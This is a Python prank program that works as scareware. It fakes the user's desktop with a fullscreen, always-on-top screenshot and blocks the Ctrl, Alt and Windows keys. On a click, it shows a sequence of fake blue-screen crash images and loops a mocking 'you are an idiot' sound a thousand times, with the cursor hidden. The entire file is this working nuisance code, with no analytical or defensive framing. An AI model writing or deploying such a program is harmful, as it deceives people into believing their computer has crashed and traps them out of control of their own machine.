import keyboard

print(keyboard.read_event())
import winsound
ISRUN = False
import tkinter as tk
import time
import pyautogui
import os,sys
from PIL import Image,ImageTk
dir = os.path.dirname(os.path.abspath(sys.argv[0]))
time.sleep(5)

pyautogui.hotkey("win", "d")

time.sleep(0.7)
im = pyautogui.screenshot('desktop.png')

root=tk.Tk()
root.geometry("{}x{}+0+0".format(root.winfo_screenwidth(),root.winfo_screenheight()))
bg = tk.PhotoImage(file="desktop.png")
bgimage= tk.Label(root, image=bg, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), borderwidth=0)
bgimage.place(x=0, y=0)
root.attributes("-fullscreen", True)
root.attributes('-topmost', True)
def updateImg(number, sleepNum):
    imgName = dir+"/bsod"+str(number)+ ".png"
    img = Image.open(imgName).resize(
        (root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
    bg1 = ImageTk.PhotoImage(img)
    bgimage.configure(image=bg1, cursor = 'none')
    bgimage.image = bg1
    root.update()
    time.sleep(sleepNum)
def initiate(e):
    global ISRUN
    if ISRUN == False:
        ISRUN = True
        time.sleep(1)
        updateImg(1, 4)
        updateImg(2, 6)
        updateImg(3, 1)
        updateImg(4, 3)
        updateImg(5, 0.5)
        updateImg(6,1)
        updateImg(7, 6.5)
        for i in range(1000):
            updateImg(8, 5)
            winsound.PlaySound(dir + '/you-are-an-idiot-hahahahahahahahahahahahahaha.wav', winsound.SND_ASYNC)
            updateImg(9, 5)
            winsound.PlaySound(dir + '/you-are-an-idiot-hahahahahahahahahahahahahaha.wav', winsound.SND_ASYNC)

bgimage.bind('<Button-1>', initiate )

keyboard.block_key('ctrl')
keyboard.block_key('left ctrl')
keyboard.block_key('right ctrl')
keyboard.block_key('alt')
keyboard.block_key('win')



root.mainloop()